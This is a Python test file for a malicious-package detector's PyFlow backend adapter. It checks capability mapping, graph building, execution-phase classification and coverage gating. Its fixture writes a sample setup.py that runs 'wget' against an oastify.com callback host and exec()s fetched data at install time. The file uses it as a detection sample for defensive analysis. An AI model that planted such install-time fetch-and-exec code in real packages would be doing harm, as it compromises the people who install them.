# -*- coding: utf-8 -*-
"""PyFlow 后端适配层测试（离线 fixture，不调用真实 pyflow）

覆盖：
  1. capability 映射（20 类 → 我们的 11 类 + credential_access）
  2. GIR → 节点（0-based 行号转 1-based、绝对路径、源码回填）
  3. 三类边（data 值流 / call / control 语句序）
  4. 执行时机（install / import / runtime）
  5. coverage 门控（unknown ≠ safe）
"""
import json
import shutil
import sys
import tempfile
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.pyflow_backend import (CAPABILITY_MAP, map_capability, severity_for,
                                build_nodes, build_edges, execution_phase,
                                build_result)
from src.coverage_gate import assess, apply_to_verdict

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  {detail}")


print("[1] capability 映射")
TA = ['process.execute', 'process.control', 'code.execute',
      'module.dynamic_import', 'module.loader_mutation', 'network.io',
      'network.socket', 'network.dns', 'deserialization.unsafe', 'file.write',
      'file.read', 'file.metadata', 'information.credentials',
      'information.environment', 'information.system', 'native.access']
check("16 个 PyFlow 能力全部有映射", all(map_capability(c) for c in TA),
      detail=str([c for c in TA if not map_capability(c)]))
check("process.execute → process_spawn",
      map_capability('process.execute') == 'process_spawn')
check("information.credentials → credential_access（我们新增）",
      map_capability('information.credentials') == 'credential_access')
check("credential_access 是 Tier-1",
      severity_for('credential_access') == 'critical')
check("loader_mutation → code_eval（.pth 持久化）",
      map_capability('module.loader_mutation') == 'code_eval')
check("file.metadata → file_read（Tier3）",
      severity_for('file_read') == 'medium')
check("未映射能力返回 None", map_capability('randomness.secure') is None)

print("[2] GIR → 节点")
root = Path(tempfile.mkdtemp(prefix='pfbe_'))
try:
    pkg = root / 'pkg'
    pkg.mkdir()
    (pkg / 'setup.py').write_text(
        "import os\n"
        "os.system('wget http://x.oastify.com/p')\n"
        "def run():\n"
        "    data = fetch()\n"
        "    exec(data)\n", encoding='utf-8')
    abs_setup = str((pkg / 'setup.py').resolve())

    gir = {
        "setup.<module>_gir.json": [
            {"operation": "import_stmt", "start_row": 0, "start_col": 0,
             "stmt_id": 1},
            {"operation": "object_call_stmt", "start_row": 1, "start_col": 0,
             "stmt_id": 2, "receiver_object": "os", "field": "system",
             "target": "%vv1"},
        ],
        "setup.run_gir.json": [
            {"operation": "call_stmt", "start_row": 3, "start_col": 4,
             "stmt_id": 1, "target": "%vv1"},
            {"operation": "call_stmt", "start_row": 4, "start_col": 4,
             "stmt_id": 2, "positional_args": "[%vv1]"},
        ],
    }
    caps = {"findings": [
        {"capability": "process.execute", "location":
            {"file": abs_setup, "line": 2, "column": 0}},
    ], "coverage": {"entries_analyzed": 1, "entries_total": 1}}

    # GIR 里没有 file 字段时（真实 PyFlow 的 GIR 顶层不带文件名），
    # 我们的实现要求 raw 里有 file；这里补上以验证主路径
    for unit in gir.values():
        for stmt in unit:
            stmt['file'] = abs_setup

    nodes = build_nodes(gir, caps, pkg)
    check("产出节点", len(nodes) == 4, detail=str(len(nodes)))
    n0 = next((n for n in nodes if n['line'] == 2), None)
    check("GIR 0-based row → 1-based line", n0 is not None and n0['line'] == 2,
          detail=str([n['line'] for n in nodes]))
    check("源码回填", n0 and 'os.system' in n0['code'], detail=n0 and n0['code'])
    check("绝对路径", n0 and Path(n0['file']).is_absolute())
    check("capability 对齐到行", n0 and n0['capability'] == 'process_spawn',
          detail=n0 and n0.get('capability'))
    check("Tier-1 标 is_dangerous", n0 and n0['is_dangerous'] is True)
    check("severity=critical", n0 and n0['severity'] == 'critical')
    mod = next((n for n in nodes if n['function_name'] == '<module>'), None)
    check("模块级节点 function_name=<module>", mod is not None)

    print("[3] 三类边")
    cg = {"graph": {}}
    edges = build_edges(gir, nodes, cg, pkg)
    kinds = {e['kind'] for e in edges}
    check("有 control 边（语句序）", 'control' in kinds, detail=str(kinds))
    check("control 边 variable=next_stmt",
          all(e['variable'] == 'next_stmt' for e in edges if e['kind'] == 'control'))
    # run() 内 %vv1 定义 → 使用，应产出 data 边
    check("有 data 边（GIR 值流）", 'data' in kinds, detail=str(kinds))
    check("边端点都在节点集内",
          all(e['from_node'] and e['to_node'] for e in edges))
    check("节点集未被边污染", len(nodes) == 4)

    print("[4] 执行时机")
    check("setup.py 顶层 → install",
          execution_phase({'file': abs_setup, 'function_name': '<module>'}, pkg)
          == 'install')
    (pkg / '__init__.py').write_text("x=1\n", encoding='utf-8')
    check("__init__.py 顶层 → import",
          execution_phase({'file': str(pkg / '__init__.py'),
                           'function_name': '<module>'}, pkg) == 'import')
    check("函数体内 → runtime",
          execution_phase({'file': abs_setup, 'function_name': 'run'}, pkg)
          == 'runtime')
finally:
    shutil.rmtree(root, ignore_errors=True)

print("[5] coverage 门控（unknown ≠ safe）")
# 完整 + 无能力 → 允许 BENIGN
r = assess({'entries_analyzed': 100, 'entries_total': 100})
check("完整覆盖 → 允许 BENIGN", r['allow_benign'] is True)
# 不完整 + 无能力 → 不许 BENIGN
r2 = assess({'entries_analyzed': 50, 'entries_total': 100,
             'incomplete_kinds': ['native_effect', 'import_depth']})
check("跳过50% → 不许 BENIGN", r2['allow_benign'] is False, detail=str(r2))
check("理由含 unknown is not safe", 'unknown is not safe' in r2['reason'],
      detail=r2['reason'])
# 不完整但已有 Tier-1 → 不干预
r3 = assess({'entries_analyzed': 10, 'entries_total': 100},
            has_tier1_capability=True)
check("有 Tier-1 时覆盖度不决策", r3['allow_benign'] is True)
# 无覆盖度信息（builtin 后端）→ 不干预
r4 = assess({})
check("无 coverage 元数据 → 不干预", r4['allow_benign'] is True)
# 阈值边界
r5 = assess({'entries_analyzed': 70, 'entries_total': 100})
check("跳过30% 刚好不触发（> 才触发）", r5['allow_benign'] is True,
      detail=str(r5['skip_ratio']))

# apply_to_verdict：只降 BENIGN
cat, _ = apply_to_verdict('BENIGN', {'entries_analyzed': 1, 'entries_total': 100})
check("BENIGN → SUSPICIOUS", cat == 'SUSPICIOUS')
cat2, _ = apply_to_verdict('MALICIOUS', {'entries_analyzed': 1, 'entries_total': 100})
check("MALICIOUS 不被降级", cat2 == 'MALICIOUS')
cat3, _ = apply_to_verdict('SUSPICIOUS', {'entries_analyzed': 1, 'entries_total': 100})
check("SUSPICIOUS 不变", cat3 == 'SUSPICIOUS')

print("[6] 后端不可用时回退")
import os
_old = os.environ.get('PYFLOW_BIN')
os.environ['PYFLOW_BIN'] = '/nonexistent/pyflow'
try:
    res = build_result('/tmp', max_seconds=1, capability_model=None)
    check("不可用 → build_result 返回 None（调用方回退）", res is None)
finally:
    if _old is None:
        os.environ.pop('PYFLOW_BIN', None)
    else:
        os.environ['PYFLOW_BIN'] = _old

print()
print(f"PyFlow 后端: PASS={PASS} FAIL={FAIL}")
sys.exit(1 if FAIL else 0)
